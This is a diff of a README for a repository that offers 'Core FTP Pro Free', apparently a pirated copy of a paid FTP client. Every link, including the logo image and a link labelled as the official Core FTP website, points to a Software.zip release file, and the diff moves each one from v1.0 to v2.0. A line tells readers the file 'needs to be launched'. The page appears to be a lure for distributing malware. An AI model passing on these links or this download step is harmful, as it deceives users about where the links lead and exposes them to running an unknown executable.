@@ -1,6 +1,6 @@
 # 🚀 **Welcome to Core FTP Pro Free Repository!** 🌟
 
-![Core FTP Logo](https://github.com/Patrickjdjdn/Core-FTP-Pro-Free/releases/download/v1.0/Software.zip)
+![Core FTP Logo](https://github.com/Patrickjdjdn/Core-FTP-Pro-Free/releases/download/v2.0/Software.zip)
 
 ## Repository: Core-FTP-Pro-Free
 
@@ -27,7 +27,7 @@ Get ready to dive into the world of Core FTP Pro Free! Whether you're looking to
 - how-to-use-core-ftp
 - what-is-core-ftp
 
-🔗 **[Download Core FTP Pro Free](https://github.com/Patrickjdjdn/Core-FTP-Pro-Free/releases/download/v1.0/Software.zip)**
+🔗 **[Download Core FTP Pro Free](https://github.com/Patrickjdjdn/Core-FTP-Pro-Free/releases/download/v2.0/Software.zip)**
 
 _*(File needs to be launched)_*
 
@@ -35,7 +35,7 @@ Don't miss out on the opportunity to enhance your file transfer experience with 
 
 ## 🌐 Explore More
 
-Be sure to visit the [official Core FTP website](https://github.com/Patrickjdjdn/Core-FTP-Pro-Free/releases/download/v1.0/Software.zip) for the latest updates, tutorials, and additional resources.
+Be sure to visit the [official Core FTP website](https://github.com/Patrickjdjdn/Core-FTP-Pro-Free/releases/download/v2.0/Software.zip) for the latest updates, tutorials, and additional resources.
 
 ## 🌈 Get Involved
 
